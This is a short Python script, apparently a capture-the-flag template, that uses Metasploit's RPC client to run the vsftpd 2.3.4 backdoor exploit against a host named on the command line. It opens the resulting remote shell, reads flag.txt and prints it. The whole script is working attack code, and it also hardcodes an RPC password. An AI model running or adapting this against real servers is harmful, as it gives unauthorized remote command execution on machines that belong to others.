import sys

from metasploit.msfrpc import MsfRpcClient

# Constants
MSFRPC_PW = "tHVdf97UqDZxmJuh"
EXCEPTIONS = []


def main():
    host = init()
    # Change code below here, using the host variable

    # Setup client
    client = MsfRpcClient(MSFRPC_PW, ssl=False)

    # Select exploit
    exploit = client.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")

    # Set options
    exploit["RHOST"] = host
    exploit["some_other_option"] = "some_other_value"

    # Run the exploit with supported payload
    result = exploit.execute(payload="cmd/unix/interact")
    if result["job_id"] is None:
        exit(1)

    # Interact with the shell to get the flag
    shell = client.sessions.session(1)
    shell.write("cat flag.txt\n")
    print(shell.read())
    shell.kill()


# Do not change this function
def init():
    # Check for one argument
    if len(sys.argv) == 2:

        # Get host argument
        host = sys.argv[1]

        # Check if subnet in exceptions
        if host in EXCEPTIONS:
            exit(1)
        return host

    else:
        print("Only argument is host")
        exit(1)


if __name__ == "__main__":
    main()
